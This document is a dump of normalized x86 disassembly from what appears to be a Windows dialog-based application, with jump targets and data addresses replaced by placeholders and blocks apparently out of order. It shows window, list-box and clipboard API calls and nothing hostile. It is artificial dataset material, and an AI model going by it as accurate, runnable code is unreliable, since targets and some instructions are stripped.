mov edx [ esp + 0x10 ]
mov ecx ebx
shl ecx 0x4
inc edx
add ecx rw-data
mov [ esp + 0x10 ] edx
add ebp 0xa0
call sub_40af70
cmp [ esp + 0x10 ] eax
jl r-xdata
push eax
call [ DestroyWindow@IAT ]
mov eax [ rw-data ]
shl eax 0x4
mov ecx [ eax + rw-data ]
mov [ ecx + ebp + 0xc ] 0x0
mov ebx [ rw-data ]
mov ecx [ esp + 0x28 ]
inc ecx
mov edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
push ebx
[ edi ] [ esi ]
call [ GlobalUnlock@IAT ]
push 0x0
call [ OpenClipboard@IAT ]
test eax eax
jne r-xdata
lea esi [ esp + 0x18 ]
call [ CloseClipboard@IAT ]
lea ecx [ esp + 0x14 ]
call sub_4480e0
jmp r-xdata
push esi
call [ GlobalLock@IAT ]
push eax
lea ecx [ esp + 0x18 ]
call sub_402510
push esi
call [ GlobalUnlock@IAT ]
call [ CloseClipboard@IAT ]
mov ecx [ rw-data ]
push 0x1
lea eax [ esp + 0x18 ]
push eax
push ecx
call sub_419810
add esp 0xc
lea ecx [ esp + 0x14 ]
call sub_4480e0
jmp r-xdata
lea ecx [ esp + 0x34 ]
call sub_4480e0
jmp r-xdata
mov esi [ esp + 0x278 ]
mov edi [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0xe
push 0x3fc
push esi
call edi
lea edx [ esp + 0x10 ]
push edx
mov ebx eax
lea eax [ esp + 0x54 ]
push eax
push 0x140
push 0x3fc
push esi
call edi
push ebx
lea ecx [ esp + 0x38 ]
call sub_401f60
mov eax [ esp + 0x4c ]
mov ebx 0x10
cmp eax ebx
mov eax [ esp + 0x38 ]
jae r-xdata
mov edx ecx
shl edx 0x4
mov eax [ edx + rw-data ]
mov edx [ esi + eax + 0xac ]
test edx edx
je r-xdata
push 0x0
push ebx
push 0x4c9
mov eax edx
push eax
call edi
mov ecx [ rw-data ]
shl eax 0x4
mov edx [ eax + rw-data ]
mov eax [ edx + esi + 0xc ]
push 0x5
push eax
call [ ShowWindow@IAT ]
mov ecx [ rw-data ]
shl ecx 0x4
mov edx [ ecx + rw-data ]
mov eax [ edx + esi + 0xc ]
push eax
call [ SetFocus@IAT ]
jmp r-xdata
push 0x0
push sub_411300
push ebx
push 0x76
push 0xfffffffa
push ebx
call [ GetWindowLongA@IAT ]
push eax
call [ CreateDialogParamA@IAT ]
mov [ esi + ebp + 0xc ] eax
mov edx [ rw-data ]
push 0x0
shl edx 0x4
mov eax [ edx + rw-data ]
mov ecx [ eax + esi + 0xc ]
push edi
push 0x4c8
push ecx
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
mov edx [ esp + 0x278 ]
push 0x3e9
push edx
call [ GetDlgItem@IAT ]
mov ebx [ SendMessageA@IAT ]
push 0x0
push 0x0
mov esi eax
push 0x188
push esi
mov [ esp + 0x40 ] esi
call ebx
push 0x0
mov edi eax
push edi
push 0x182
push esi
call ebx
mov ebx [ rw-data ]
mov eax ebx
shl eax 0x4
mov ecx [ eax + rw-data ]
lea ebp [ edi + edi * 4 ]
shl ebp 0x5
mov eax [ ecx + ebp + 0xc ]
test eax eax
je r-xdata
dec eax
jne r-xdata
mov eax [ esp + 0x30 ]
mov esi [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
shl ebx 0x4
mov ebx [ ebx + rw-data ]
add eax esi
push eax
mov ecx ebx
call sub_414c30
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
push 0x1
lea edx [ esp + 0x18 ]
push 0x0
push edx
mov [ esp + 0x27c ] 0x3
call sub_410cb0
mov edi [ esp + 0x284 ]
add esp 0xc
push 0x3e9
push edi
call [ GetDlgItem@IAT ]
mov esi eax
cmp [ esp + 0x2c ] 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
lea esi [ edi + edi * 4 ]
shl esi 0x5
jmp r-xdata
cmp eax 0x3e9
jne r-xdata
mov edi [ esp + 0x278 ]
je r-xdata
push edx
lea ecx [ esp + 0x16c ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
lea edx [ esp + 0x168 ]
push edx
push 0x0
push 0xc
push edi
call [ SendMessageA@IAT ]
push 0x3e9
push esi
call ebp
push 0x3e9
push esi
mov ebx eax
call ebp
push eax
call [ GetDC@IAT ]
mov [ esp + 0x30 ] eax
mov [ esp + 0x10 ] 0x0
mov ecx [ eax + 0x8 ]
sub ecx edx
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
lea eax [ edi + ebx + 0x14 ]
mov eax [ edi + ebx + 0x14 ]
jmp r-xdata
push eax
push 0x0
push 0x180
push edi
call [ SendMessageA@IAT ]
lea ecx [ esp + 0x14 ]
mov [ esp + 0x270 ] 0xffffffff
call sub_4480e0
mov ecx [ rw-data ]
shl ecx 0x4
add ecx rw-data
inc esi
call sub_40af70
cmp esi eax
jl r-xdata
lea eax [ esp + 0x18 ]
mov edx [ esp + 0x30 ]
push 0x0
push 0x0
push 0x182
push edx
call [ SendMessageA@IAT ]
mov esi [ rw-data ]
mov eax esi
shl eax 0x4
mov eax [ eax + rw-data ]
mov ecx [ eax + edi + 0xc ]
test ecx ecx
je r-xdata
push 0x1
push 0x0
jmp r-xdata
push 0x0
push 0x0
push 0x182
push 0x3e9
push esi
call edi
push eax
call [ SendMessageA@IAT ]
mov ebx [ rw-data ]
mov ecx ebx
shl ecx 0x4
mov edx [ ecx + rw-data ]
mov eax [ edx + ebp + 0xc ]
test eax eax
je r-xdata
call [ EmptyClipboard@IAT ]
push ebx
push 0x1
call [ SetClipboardData@IAT ]
push ebx
call [ GlobalFree@IAT ]
mov ecx [ esp + 0x278 ]
push 0x0
push r--data
push r--data
push ecx
call [ MessageBoxA@IAT ]
lea ecx [ esp + 0x14 ]
call sub_4480e0
jmp r-xdata
mov ecx [ esp + 0x48 ]
push eax
inc ecx
push ecx
push 0xd
push 0x3fc
push esi
call edi
mov ecx [ rw-data ]
imul ecx ecx 0x1c
push 0xffffffff
push 0x0
lea edx [ esp + 0x3c ]
push edx
add ecx rw-data
call sub_401dd0
mov eax [ rw-data ]
push 0x0
push eax
push 0x144
push 0x3fc
push esi
call edi
mov ecx [ rw-data ]
mov eax ecx
imul eax eax 0x1c
add eax rw-data
cmp [ eax + 0x18 ] ebx
jb r-xdata
lea eax [ esp + 0x38 ]
shl ecx 0x4
mov ecx [ ecx + rw-data ]
mov al [ esi + ecx + 0x4 ]
test al al
jne r-xdata
mov ecx [ esp + 0x10 ]
push 0x0
push ecx
push 0x4c9
push edx
call edi
mov ecx [ rw-data ]
mov esi ebx
shl esi 0x4
lea ecx [ esi + rw-data ]
mov [ esp + 0x10 ] edi
call sub_40af70
dec eax
cmp edi eax
jge r-xdata
push eax
call [ DestroyWindow@IAT ]
mov edx [ rw-data ]
shl edx 0x4
mov eax [ edx + rw-data ]
mov [ eax + ebp + 0xc ] 0x0
mov ebx [ rw-data ]
mov edx [ esp + 0x278 ]
push 0x3e9
push edx
call [ GetDlgItem@IAT ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
mov ebp eax
push 0x188
push ebp
call edi
mov ebx eax
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
lea ecx [ esp + 0x68 ]
mov [ esp + 0x270 ] 0x5
call sub_413b80
push 0x0
lea eax [ ebx - 0x1 ]
push eax
push 0x18a
push ebp
mov [ esp + 0x280 ] 0x6
mov [ esp + 0x20 ] eax
call edi
push eax
lea ecx [ esp + 0x18 ]
call sub_401f60
cmp [ esp + 0x2c ] 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
push eax
push 0x0
push 0x181
push esi
call ebp
push 0x0
push 0x0
push 0x186
push esi
call ebp
push esi
push 0x103e9
push 0x111
push edi
call ebp
mov eax [ rw-data ]
shl eax 0x4
mov ecx [ eax + rw-data ]
mov al [ ecx + 0x4 ]
test al al
jne r-xdata
lea eax [ esp + 0x18 ]
shl ebx 0x4
mov eax [ ebx + rw-data ]
lea edx [ eax + esi - 0xa0 ]
add eax esi
push edx
mov ecx eax
call sub_414c30
mov ebx [ rw-data ]
mov eax ebx
shl eax 0x4
mov eax [ eax + rw-data ]
mov ecx [ eax + esi + 0xc ]
test ecx ecx
je r-xdata
shr esi 0x10
cmp esi 0x1
jne r-xdata
shr esi 0x10
cmp esi 0x1
jne r-xdata
dec eax
je r-xdata
mov ecx [ eax + 0x8 ]
sub ecx edx
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ebx [ rw-data ]
test ebx ebx
jne r-xdata
mov edx [ esp + 0x50 ]
push eax
push 0x0
push 0x180
push edx
call [ SendMessageA@IAT ]
inc [ esp + 0x10 ]
add edi 0xa0
jmp r-xdata
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
push 0x1
lea ecx [ esp + 0x18 ]
push esi
push ecx
mov [ esp + 0x27c ] 0x2
call sub_410cb0
mov eax [ esp + 0x38 ]
add esp 0xc
cmp eax 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
push 0x3f4
push eax
call [ CheckDlgButton@IAT ]
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov [ esp + 0x270 ] 0x7
jmp r-xdata
mov al [ esi + ecx + 0xa4 ]
test al al
jne r-xdata
shl ebx 0x4
lea ebx [ ebx + rw-data ]
mov ecx ebx
call sub_40af70
dec eax
push eax
mov ecx ebx
call sub_416d90
mov ecx [ rw-data ]
shl ecx 0x4
add ecx rw-data
call sub_40af70
cmp edi eax
jne r-xdata
lea esp [ esp ]
push eax
mov eax [ esp + 0x14 ]
push eax
push 0x189
push ebp
call edi
mov ecx [ rw-data ]
shl ecx 0x4
mov eax [ ecx + rw-data ]
lea esi [ ebx + ebx * 4 ]
shl esi 0x5
lea eax [ eax + esi - 0xa0 ]
push eax
lea ecx [ esp + 0x6c ]
call sub_414c30
mov edx [ esp + 0x10 ]
push 0x0
push edx
push 0x182
push ebp
call edi
mov eax [ rw-data ]
shl eax 0x4
mov eax [ eax + rw-data ]
lea edx [ esi + eax ]
lea ecx [ esi + eax - 0xa0 ]
push edx
call sub_414c30
cmp [ esp + 0x2c ] 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
lea eax [ esp + 0x18 ]
mov ecx [ rw-data ]
shl ecx 0x4
add ecx rw-data
call sub_40af70
push eax
lea eax [ esp + 0x6c ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea ecx [ esp + 0x68 ]
push ecx
push 0x0
push 0xc
push 0x3f2
push edi
call [ SendDlgItemMessageA@IAT ]
lea ecx [ esp + 0x14 ]
call sub_4480e0
jmp r-xdata
xor edx edx
mov dl [ rw-data ]
push edx
push 0x1
push 0xfffffff8
push edi
call [ GetWindowLongA@IAT ]
push eax
call sub_47e8e0
add esp 0xc
dec edi
sub esi 0xa0
cmp edi 0x1
jge r-xdata
push 0x0
push edi
push 0x4c9
push ecx
call ebp
mov ebx [ rw-data ]
mov esi [ esp + 0x278 ]
mov edi [ GetDlgItem@IAT ]
push 0x0
push 0x0
push 0x188
push eax
push esi
call edi
push eax
call [ SendMessageA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
mov esi [ GetDlgItem@IAT ]
push 0x0
push 0x0
push 0x188
push 0x3e8
push edi
call esi
push eax
call [ SendMessageA@IAT ]
cmp eax 0xffffffff
je r-xdata
mov esi [ rw-data ]
shl esi 0x4
lea ecx [ esi + rw-data ]
xor edi edi
call sub_40af70
test eax eax
mov ebp [ ShowWindow@IAT ]
jle r-xdata
dec eax
jne r-xdata
mov edx [ esp + 0x30 ]
push edx
push 0x3e9
push esi
call ebp
push eax
call [ ReleaseDC@IAT ]
push edi
push 0x3eb
push esi
call ebp
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push edi
push 0x3ec
push esi
call ebp
push eax
call ebx
push edi
push 0x3ed
push esi
call ebp
push eax
call ebx
push edi
push 0x3ee
push esi
call ebp
push eax
call ebx
push edi
push 0x3f0
push esi
call ebp
push eax
call ebx
push 0x3f3
push esi
call ebp
push esi
mov [ rw-data ] eax
call [ SetFocus@IAT ]
mov eax 0x1
jmp r-xdata
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] edi
mov [ esp + 0x38 ] 0x0
push 0x1
push eax
lea ecx [ esp + 0x3c ]
push ecx
mov [ esp + 0x27c ] edi
call sub_410cb0
mov eax [ esp + 0x58 ]
add esp 0xc
cmp eax 0x10
mov eax [ esp + 0x38 ]
jae r-xdata
mov eax [ esp + 0x10 ]
cmp eax edx
jge r-xdata
push eax
push 0x0
push 0xc
push 0x3fc
push esi
call edi
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x50 ]
shl ecx 0x10
or ecx eax
push ecx
push 0x0
push 0x142
push 0x3fc
push esi
call edi
lea ecx [ esp + 0x34 ]
call sub_4480e0
jmp r-xdata
lea eax [ esp + 0x38 ]
push eax
push ecx
push 0x14a
push 0x3fc
push esi
call edi
cmp [ esp + 0x4c ] ebx
mov eax [ esp + 0x38 ]
jae r-xdata
lea ecx [ esp + 0x68 ]
call sub_413c10
lea ecx [ esp + 0x14 ]
call sub_4480e0
jmp r-xdata
mov ecx [ esp + 0x278 ]
xor eax eax
mov al [ rw-data ]
push eax
push 0x1
push 0xfffffff8
push ecx
call [ GetWindowLongA@IAT ]
push eax
call sub_47e8e0
add esp 0xc
mov esi [ esp + 0x30 ]
mov ebp [ SendMessageA@IAT ]
push 0x0
push edi
push 0x186
push esi
call ebp
mov ecx [ esp + 0x278 ]
push esi
push 0x103e9
push 0x111
push ecx
call ebp
mov esi [ rw-data ]
shl esi 0x4
lea ecx [ esi + rw-data ]
xor edi edi
call sub_40af70
test eax eax
jle r-xdata
dec edi
mov ecx [ esi + rw-data ]
add ecx ebp
lea edx [ ecx + 0xa0 ]
push edx
call sub_414c30
mov eax [ esp + 0x10 ]
mov ebx [ rw-data ]
inc eax
mov [ esp + 0x10 ] eax
mov eax ebx
shl eax 0x4
mov esi eax
lea ecx [ esi + rw-data ]
add ebp 0xa0
call sub_40af70
mov ecx [ esp + 0x10 ]
dec eax
cmp ecx eax
jl r-xdata
push eax
push ebx
push 0x181
push ebp
call edi
mov ecx [ rw-data ]
shl ecx 0x4
mov eax [ ecx + rw-data ]
lea edx [ esp + 0x68 ]
lea ecx [ esi + eax ]
push edx
call sub_414c30
mov eax [ esp + 0x278 ]
push ebp
push 0x103e9
push 0x111
push eax
call edi
mov ecx [ rw-data ]
mov edx ecx
shl edx 0x4
mov eax [ edx + rw-data ]
mov edx [ esi + eax + 0xc ]
test edx edx
je r-xdata
lea eax [ esp + 0x18 ]
push 0x0
push 0x3eb
push esi
call edi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x0
push 0x3ec
push esi
call edi
push eax
call ebx
push 0x0
push 0x3ed
push esi
call edi
push eax
call ebx
push 0x0
push 0x3ee
push esi
call edi
push eax
call ebx
push 0x0
push 0x3f0
push esi
call edi
push eax
call ebx
jmp r-xdata
push 0x1
push 0x3eb
push esi
call edi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x1
push 0x3ec
push esi
call edi
push eax
call ebx
test ebp ebp
jne r-xdata
push 0x0
push 0x3ea
push edi
call esi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x0
push 0x3ef
push edi
call esi
push eax
call ebx
jmp r-xdata
push 0x1
push 0x3ea
push edi
call esi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x1
push 0x3ef
push edi
call esi
push eax
call ebx
jmp r-xdata
mov ecx [ esp + 0x278 ]
push 0x0
push ecx
call ebp
jmp r-xdata
xor ebx ebx
push 0x0
push edi
call [ ShowWindow@IAT ]
mov ecx [ esp + 0x268 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x264
retn 0x10
push eax
push 0x0
push 0x180
push ebx
call [ SendMessageA@IAT ]
lea edx [ esp + 0x58 ]
push edx
push 0x3e9
push esi
call ebp
push eax
call [ GetClientRect@IAT ]
mov edi [ esp + 0x60 ]
mov ecx [ esp + 0x58 ]
mov eax [ esp + 0x4c ]
sub edi ecx
cmp eax 0x10
mov eax [ esp + 0x38 ]
jae r-xdata
lea eax [ esp + 0x38 ]
mov ecx [ rw-data ]
shl ecx 0x4
add ecx rw-data
call sub_40af70
push eax
lea ecx [ esp + 0x6c ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov esi [ esp + 0x284 ]
add esp 0xc
lea edx [ esp + 0x68 ]
push edx
push 0x0
push 0xc
push 0x3f2
push esi
call [ SendDlgItemMessageA@IAT ]
xor eax eax
mov al [ rw-data ]
push eax
push 0x1
push 0xfffffff8
push esi
call [ GetWindowLongA@IAT ]
push eax
call sub_47e8e0
add esp 0xc
jmp r-xdata
xor ebx ebx
lea esp [ esp ]
mov edx ecx
shl edx 0x4
mov eax [ edx + rw-data ]
mov edx [ esi + eax - 0x94 ]
test edx edx
je r-xdata
push 0x0
push ebx
push 0x4c9
mov eax edx
push eax
call edi
mov ecx [ rw-data ]
push 0x1
push ebp
jmp r-xdata
mov esi [ rw-data ]
shl esi 0x4
lea ecx [ esi + rw-data ]
inc edi
add ebx 0xa0
call sub_40af70
cmp edi eax
jl r-xdata
push 0x0
push eax
call ebp
mov edx [ esp + 0x48 ]
lea ecx [ esp + 0x50 ]
push ecx
push edx
push eax
mov eax [ esp + 0x3c ]
push eax
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp + 0x50 ]
cmp edi eax
jge r-xdata
lea eax [ esp + 0x38 ]
mov edx [ esi + rw-data ]
mov eax [ edx + ebx + 0xc ]
push 0x0
push edi
push 0x4c9
push eax
call ebp
mov esi [ rw-data ]
shl esi 0x4
lea ecx [ esi + rw-data ]
inc edi
add ebx 0xa0
call sub_40af70
cmp edi eax
jl r-xdata
shl ecx 0x4
mov ecx [ ecx + rw-data ]
mov al [ esi + ecx + 0x4 ]
test al al
jne r-xdata
mov ecx [ esp + 0x10 ]
push 0x0
push ecx
push 0x4c9
push edx
call edi
mov ecx [ rw-data ]
push 0x1
push 0x0
jmp r-xdata
push 0x3ed
push esi
call edi
push eax
call ebx
push 0x0
push 0x0
push 0x18b
push 0x3e9
push esi
call edi
push eax
call [ SendMessageA@IAT ]
dec eax
cmp ebp eax
jne r-xdata
mov eax [ esi + rw-data ]
mov eax [ eax + ebx + 0xc ]
test eax eax
je r-xdata
cmp [ esp + 0x4c ] 0x10
mov [ esp + 0x270 ] 0xffffffff
jb r-xdata
push 0x0
push eax
push 0x194
push ebx
call [ SendMessageA@IAT ]
mov [ esp + 0x270 ] 0x5
mov al [ esi + ecx - 0x9c ]
test al al
jne r-xdata
push r--data
push 0x3f0
push esi
call edi
push eax
call [ SetWindowTextA@IAT ]
jmp r-xdata
push r--data
push 0x3f0
push esi
call edi
push eax
call [ SetWindowTextA@IAT ]
jmp r-xdata
push 0x3ee
push esi
call edi
push eax
call ebx
push 0x1
push 0x3f0
push esi
call edi
push eax
call ebx
mov edx [ rw-data ]
shl edx 0x4
mov ecx [ edx + rw-data ]
lea eax [ ebp + ebp * 4 ]
shl eax 0x5
mov dl [ ecx + eax + 0x4 ]
test dl dl
je r-xdata
mov eax [ esp + 0x10 ]
inc eax
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x10 ] eax
jmp r-xdata
mov ecx [ esp + 0x38 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x278 ]
xor eax eax
mov al [ rw-data ]
push eax
push 0x1
push 0xfffffff8
push ecx
call [ GetWindowLongA@IAT ]
push eax
call sub_47e8e0
add esp 0xc
mov eax [ rw-data ]
shl eax 0x4
add eax rw-data
mov edx [ eax + 0x4 ]
xor edi edi
cmp edx edi
jne r-xdata
sub_41b660
mov eax [ rw-data ]
test eax eax
jne r-xdata
push esi
mov esi [ ShowWindow@IAT ]
push 0x5
push eax
call esi
test eax eax
jne r-xdata
push eax
mov eax [ esp + 0x8 ]
push sub_419b40
push eax
push 0x75
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ CreateDialogParamA@IAT ]
mov [ rw-data ] eax
mov ecx [ rw-data ]
push 0x0
push ecx
call esi
pop esi
retn
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
pop esi
retn
sub_41b6c0
push 0xffffffff
push sub_4bfa2f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push ebp
push esi
xor ebx ebx
push edi
mov [ esp + 0x10 ] ebx
mov al [ rw-data ]
test al al
mov esi 0x1
mov [ esp + 0x28 ] esi
jne r-xdata
mov [ esp + 0x14 ] ebx
mov ecx rw-data
mov [ esp + 0x28 ] 0x2
mov [ esp + 0x1c ] ecx
call sub_404310
mov ebp [ esp + 0x34 ]
mov esi [ ebp ]
push esi
mov [ esp + 0x2c ] 0x3
call sub_419a00
mov eax [ esp + 0x4c ]
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x44 ]
add esp 0x4
push eax
mov eax [ esp + 0x40 ]
push ecx
mov ecx [ esp + 0x40 ]
push edx
push eax
push ecx
push ecx
mov [ esp + 0x30 ] esp
inc [ ebp + 0xd48 ]
mov eax esp
lea edx [ esp + 0x30 ]
push edx
mov ecx rw-data
mov [ eax ] ebp
call sub_414000
mov edi [ eax ]
cmp edi ebx
je r-xdata
push rw-data
push rw-data
call sub_419a80
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
cmp eax ebx
mov [ esp + 0x14 ] edi
je r-xdata
inc [ edi ]
mov edi [ esp + 0x30 ]
mov [ edi ] ebx
mov [ esp + 0x10 ] esi
mov esi [ esp + 0x34 ]
cmp esi ebx
mov [ esp + 0x28 ] al
je r-xdata
cmp [ rw-data ] 0x14
jne r-xdata
cmp [ eax ] 0x1
mov ecx eax
jne r-xdata
mov eax edi
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c
retn
dec [ esi + 0xd48 ]
jne r-xdata
mov ecx rw-data
call sub_401420
test edi edi
je r-xdata
mov ebx [ rw-data ]
test ebx ebx
jne r-xdata
dec [ ecx ]
mov eax [ eax + 0x4 ]
dec [ eax + 0xc ]
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
test edi edi
mov esi [ esp + 0x30 ]
mov [ esi ] edi
mov [ esp + 0x10 ] 0x1
je r-xdata
inc [ edi ]
mov ecx [ rw-data ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ ebp + 0xd48 ]
dec eax
mov [ esp + 0x28 ] 0x0
mov [ ebp + 0xd48 ] eax
jne r-xdata
cmp [ edi ] 0x1
jne r-xdata
imul esi esi 0x70
lea ecx [ esi + ebx + 0x54 ]
call sub_401f20
mov ecx [ rw-data ]
push 0x0
lea edx [ esi + ecx + 0x54 ]
push edx
push 0x14
call sub_4135e0
add esp 0xc
cmp esi edx
jge r-xdata
mov ecx [ esp + 0x20 ]
pop edi
mov eax esi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x1c
retn
mov ecx ebp
call sub_43fe30
push ebp
call j_sub_4b66ed#2
add esp 0x4
dec [ edi ]
mov eax [ edi + 0x4 ]
dec [ eax + 0xc ]
sub_41b900
push edi
mov edi ecx
mov ecx [ esp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
push esi
call [ eax + 0x8 ]
mov esi eax
test esi esi
jne r-xdata
xor al al
pop edi
retn 0x4
mov edx [ esi ]
mov ecx esi
call [ edx + 0xc ]
cmp eax 0x1
jne r-xdata
pop esi
xor al al
pop edi
retn 0x4
mov eax [ edi + 0x20 ]
sub eax [ esi + 0x20 ]
neg eax
sbb eax eax
pop esi
inc eax
pop edi
retn 0x4
sub_41b950
mov eax [ esp + 0xc ]
sub eax 0x0
push esi
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
dec eax
je r-xdata
push r--data
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x18 ] 0xfffffffb
call sub_4b5bd2
jg r-xdata
mov eax [ esp + 0x8 ]
mov edx [ ecx + 0x10 ]
add edx eax
mov eax [ ecx + 0x14 ]
mov [ ecx + 0x10 ] edx
mov edx [ esp + 0xc ]
adc eax edx
mov [ ecx + 0x14 ] eax
jmp r-xdata
dec eax
jne r-xdata
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0xc ]
cmp eax ecx
jl r-xdata
test esi esi
jb r-xdata
mov eax [ ecx + 0x14 ]
test eax eax
mov esi [ ecx + 0x10 ]
jl r-xdata
mov edx [ esp + 0x8 ]
mov eax [ ecx + 0x8 ]
mov esi [ esp + 0xc ]
sub eax edx
mov edx [ ecx + 0xc ]
sbb edx esi
jmp r-xdata
pop esi
retn 0xc
jg r-xdata
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] edx
test ecx ecx
jl r-xdata
cmp esi edx
jbe r-xdata
jg r-xdata
test edx edx
jbe r-xdata
sub_41b9f0
push ebx
mov eax ecx
mov ecx [ eax + 0x10 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi [ eax + 0xc ]
xor ebx ebx
mov edx ebp
add edx ecx
push edi
mov edi [ eax + 0x14 ]
mov ecx ebx
adc ecx edi
cmp ecx esi
jl r-xdata
mov edi [ eax + 0x10 ]
mov esi [ eax + 0x20 ]
add esi edi
mov edi [ esp + 0x14 ]
mov ecx ebp
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edx [ eax + 0x10 ]
mov ecx [ eax + 0x14 ]
pop edi
add edx ebp
pop esi
adc ecx ebx
pop ebp
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] ecx
pop ebx
retn 0x8
jg r-xdata
push r--data
lea eax [ esp + 0x1c ]
push eax
mov [ esp + 0x20 ] 0x1
call sub_4b5bd2
cmp edx [ eax + 0x8 ]
jbe r-xdata
sub_41ba70
push ebx
mov eax ecx
mov ecx [ eax + 0x10 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi [ eax + 0xc ]
xor ebx ebx
mov edx ebp
add edx ecx
push edi
mov edi [ eax + 0x14 ]
mov ecx ebx
adc ecx edi
cmp ecx esi
jl r-xdata
mov edx [ eax + 0x10 ]
mov edi [ eax + 0x20 ]
mov esi [ esp + 0x14 ]
add edi edx
mov ecx ebp
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edx [ eax + 0x10 ]
mov ecx [ eax + 0x14 ]
pop edi
add edx ebp
pop esi
adc ecx ebx
pop ebp
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] ecx
pop ebx
retn 0x8
jg r-xdata
push r--data
lea eax [ esp + 0x1c ]
push eax
mov [ esp + 0x20 ] 0xfffffff9
call sub_4b5bd2
cmp edx [ eax + 0x8 ]
jbe r-xdata
sub_41bb20
push 0xffffffff
push sub_4bfa53
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
xor edx edx
push ebp
push esi
mov esi ecx
push edi
mov [ esp + 0x10 ] esi
mov [ esi + 0x4 ] edx
mov [ esi + 0x10 ] edx
mov [ esi + 0x14 ] edx
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] edx
mov [ esi + 0x18 ] edx
lea ecx [ esi + 0x20 ]
mov [ esi ] r--data
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] edx
mov [ esp + 0x1c ] edx
mov [ ecx + 0x4 ] dl
mov edi [ esp + 0x24 ]
mov eax edi
mov [ esp + 0x1c ] 0x1
lea ebp [ eax + 0x1 ]
lea esp [ esp ]
mov bl [ eax ]
inc eax
cmp bl dl
jne r-xdata
sub eax ebp
push eax
push edi
call sub_401e80
mov ecx [ esp + 0x14 ]
pop edi
mov [ esi + 0x3c ] 0xffffffff
mov eax esi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_41bbd0
mov eax [ esp + 0xc ]
sub eax 0x0
push esi
mov esi ecx
je r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0xc ]
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] edx
dec eax
je r-xdata
push r--data
lea ecx [ esp + 0x14 ]
push ecx
mov [ esp + 0x18 ] 0xfffffffb
call sub_4b5bd2
int3
jg r-xdata
mov eax [ esi + 0x10 ]
mov edx [ esp + 0x8 ]
mov ecx [ esi + 0x14 ]
add eax edx
mov [ esi + 0x10 ] eax
mov eax [ esp + 0xc ]
adc ecx eax
mov [ esi + 0x14 ] ecx
jmp r-xdata
dec eax
jne r-xdata
cmp eax [ esi + 0xc ]
jl r-xdata
test ecx ecx
jb r-xdata
mov eax [ esi + 0x14 ]
test eax eax
mov ecx [ esi + 0x10 ]
jl r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ esi + 0x8 ]
mov edx [ esp + 0xc ]
sub eax ecx
mov ecx [ esi + 0xc ]
sbb ecx edx
mov [ esi + 0x10 ] eax
